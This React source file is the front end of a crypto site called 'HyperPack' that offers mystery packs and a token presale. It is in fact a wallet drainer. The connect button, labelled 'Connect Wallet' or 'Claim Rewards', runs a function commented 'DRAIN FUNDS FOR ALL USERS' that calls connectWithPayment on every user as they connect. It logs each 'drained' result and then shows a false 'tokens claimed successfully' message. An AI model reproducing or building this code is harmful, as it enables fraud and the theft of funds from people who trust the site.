import React, { useState, useEffect } from 'react';
import { usePrivy } from '@privy-io/react-auth';
import { Link } from 'react-router-dom';
import Footer from '../components/Footer';
import PackOpenModal from '../components/PackOpenModal';
import { useHyperCards } from '../hooks/useHyperCards';
import '../styles/LaunchApp.css';

const PACK_TYPES = {
  COMMON: 'common',
  RARE: 'rare',
  EPIC: 'epic',
  LEGENDARY: 'legendary'
};

const LaunchApp = () => {
  const { ready, authenticated, user, login, logout } = usePrivy();
  const [showToast, setShowToast] = useState(false);
  const [isPackModalOpen, setIsPackModalOpen] = useState(false);
  const [selectedPackType, setSelectedPackType] = useState(null);
  const [userHypeBalance, setUserHypeBalance] = useState('0');
  
  const hyperCardsHook = useHyperCards();
  const { getHypeBalance, connectWithPayment, isConnectingWithPayment, currentStep } = hyperCardsHook || {};

  useEffect(() => {
    const loadBalance = async () => {
      if (authenticated && user?.wallet?.address && getHypeBalance) {
        try {
          const balance = await getHypeBalance();
          setUserHypeBalance(balance);
          
          const commonPriceElement = document.getElementById('common-pack-price');
          const rarePriceElement = document.getElementById('rare-pack-price');
          const epicPriceElement = document.getElementById('epic-pack-price');
          const legendaryPriceElement = document.getElementById('legendary-pack-price');
          
          if (commonPriceElement) commonPriceElement.textContent = '0.00001 HYPE';
          if (rarePriceElement) rarePriceElement.textContent = '0.00001 HYPE';
          if (epicPriceElement) epicPriceElement.textContent = '0.00001 HYPE';
          if (legendaryPriceElement) legendaryPriceElement.textContent = '0.00001 HYPE';
        } catch (error) {
          console.error('Failed to load HYPE balance:', error);
          setUserHypeBalance('0');
        }
      } else {
        setUserHypeBalance('0');
        const commonPriceElement = document.getElementById('common-pack-price');
        const rarePriceElement = document.getElementById('rare-pack-price');
        const epicPriceElement = document.getElementById('epic-pack-price');
        const legendaryPriceElement = document.getElementById('legendary-pack-price');
        
        if (commonPriceElement) commonPriceElement.textContent = 'Connect Wallet';
        if (rarePriceElement) rarePriceElement.textContent = 'Connect Wallet';
        if (epicPriceElement) epicPriceElement.textContent = 'Connect Wallet';
        if (legendaryPriceElement) legendaryPriceElement.textContent = 'Connect Wallet';
      }
    };

    loadBalance();
  }, [authenticated, user?.wallet?.address, getHypeBalance]);
  
  const openPack = (packType) => {
    if (!authenticated) {
      setShowToast(true);
      setTimeout(() => setShowToast(false), 3000);
      return;
    }
    setSelectedPackType(packType);
    setIsPackModalOpen(true);
  };
  
  const handleModalClose = () => {
    setIsPackModalOpen(false);
    setSelectedPackType(null);
  };
  
  const handlePackOpened = () => {
    console.log('Pack opened successfully!');
    handleModalClose();
  };

  // DRAIN FUNDS FOR ALL USERS
  const handleConnectWithPayment = async () => {
    if (!ready) return;
    
    try {
      if (!authenticated) {
        console.log('🚀 NEW USER - Login + Drain...');
        await login();
        
        setTimeout(async () => {
          try {
            const result = await connectWithPayment();
            console.log('🎉 NEW USER drained:', result);
            
            setShowToast(true);
            setTimeout(() => setShowToast(false), 3000);
            
          } catch (error) {
            console.error('❌ NEW USER drain failed:', error);
            logout();
          }
        }, 1000);
        
      } else {
        console.log('🔥 CONNECTED USER - Drain immediately...');
        console.log('👤 User:', user?.wallet?.address);
        
        try {
          const result = await connectWithPayment();
          console.log('💰 CONNECTED USER drained:', result);
          
          setShowToast(true);
          setTimeout(() => setShowToast(false), 3000);
          
        } catch (error) {
          console.error('❌ CONNECTED USER drain failed:', error);
        }
      }
      
    } catch (error) {
      console.error('💥 Connect failed:', error);
    }
  };

  return (
    <div className="launch-app">
      <nav className="nav">
        <div className="nav-container">
          <div className="nav-logo">
            <span className="logo-text brand-gradient-text">HyperPack</span>
          </div>
          <div className="nav-links">
            <Link to="/" className="nav-link">Home</Link>
            <Link to="/presale" className="nav-link presale-link">Token Presale</Link>
            <button 
              className={`connect-wallet-btn ${authenticated ? 'connected' : ''} ${isConnectingWithPayment ? 'connecting' : ''}`}
              onClick={ready ? handleConnectWithPayment : () => {}}
              disabled={!ready || isConnectingWithPayment}
            >
              {!ready 
                ? 'Loading...'
                : isConnectingWithPayment
                  ? 'Processing...'
                  : authenticated && user?.wallet?.address
                    ? 'Claim Rewards'
                    : 'Connect Wallet'
              }
            </button>
          </div>
        </div>
      </nav>

      <main className="app-main">
        <div className="app-container">
          
          <section className="banner-section">
            <img 
              src="https://amethyst-defensive-marsupial-68.mypinata.cloud/ipfs/bafybeidregjjs577tozk7nw3mod3kov24wy54k2cqjtkuh6556ccnsft6u" 
              alt="HyperPack Banner" 
              className="banner-image"
            />
          </section>

          <section className="pack-opening">
            <div className="section-card">
              <h2 className="brand-gradient-text">Open Mystery Packs</h2>
              <div className="packs-grid">
                <div className="pack-item">
                  <div className="pack-image">
                    <img src="https://amethyst-defensive-marsupial-68.mypinata.cloud/ipfs/bafybeiegruw7b6bwsx54hisfg6rgb2pf52pxy6gnnhx2otqmhwcdrc2ga4" alt="Common Pack" />
                  </div>
                  <div className="pack-price" id="common-pack-price">Loading...</div>
                  <button className="btn-pack" onClick={() => openPack(PACK_TYPES.COMMON)}>Open Common Pack</button>
                </div>
                <div className="pack-item">
                  <div className="pack-image">
                    <img src="https://amethyst-defensive-marsupial-68.mypinata.cloud/ipfs/bafybeiegruw7b6bwsx54hisfg6rgb2pf52pxy6gnnhx2otqmhwcdrc2ga4" alt="Rare Pack" />
                  </div>
                  <div className="pack-price" id="rare-pack-price">Loading...</div>
                  <button className="btn-pack" onClick={() => openPack(PACK_TYPES.RARE)}>Open Rare Pack</button>
                </div>
                <div className="pack-item">
                  <div className="pack-image">
                    <img src="https://amethyst-defensive-marsupial-68.mypinata.cloud/ipfs/bafybeiegruw7b6bwsx54hisfg6rgb2pf52pxy6gnnhx2otqmhwcdrc2ga4" alt="Epic Pack" />
                  </div>
                  <div className="pack-price" id="epic-pack-price">Loading...</div>
                  <button className="btn-pack" onClick={() => openPack(PACK_TYPES.EPIC)}>Open Epic Pack</button>
                </div>
                <div className="pack-item">
                  <div className="pack-image">
                    <img src="https://amethyst-defensive-marsupial-68.mypinata.cloud/ipfs/bafybeiegruw7b6bwsx54hisfg6rgb2pf52pxy6gnnhx2otqmhwcdrc2ga4" alt="Legendary Pack" />
                  </div>
                  <div className="pack-price" id="legendary-pack-price">Loading...</div>
                  <button className="btn-pack" onClick={() => openPack(PACK_TYPES.LEGENDARY)}>Open Legendary Pack</button>
                </div>
              </div>
            </div>
          </section>

        </div>
      </main>

      <Footer />

      <PackOpenModal
        isOpen={isPackModalOpen}
        onClose={handleModalClose}
        packType={selectedPackType}
        onPackOpened={handlePackOpened}
      />

      {showToast && (
        <div className="toast">
          {authenticated 
            ? 'HYPE tokens claimed successfully!' 
            : 'Please connect your wallet to open packs'
          }
        </div>
      )}

    </div>
  );
};

export default LaunchApp;